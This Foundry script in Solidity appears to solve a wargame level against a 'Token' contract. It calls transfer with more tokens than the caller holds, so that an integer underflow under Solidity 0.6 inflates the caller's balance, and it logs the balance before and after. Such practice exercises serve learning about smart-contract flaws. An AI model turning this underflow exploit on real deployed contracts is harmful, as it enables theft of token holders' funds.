// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level05.sol";

contract Level5Script is Script {
    Token level5 = Token(0xe0A4fbD240F702C8883F2589804650F7d28419E9);

    function run() external {
        vm.startBroadcast();

        console.log(
            "balance before transfer: ",
            level5.balanceOf(0x69272551Ae1Afb5bb612C776BB907946705164BA)
        );
        level5.transfer(0x157Bb955182e2d1B7eD2C2E90Bc523Cd8B95Ce73, 1000);
        console.log(
            "balance after transfer: ",
            level5.balanceOf(0x69272551Ae1Afb5bb612C776BB907946705164BA)
        );

        vm.stopBroadcast();
    }
}
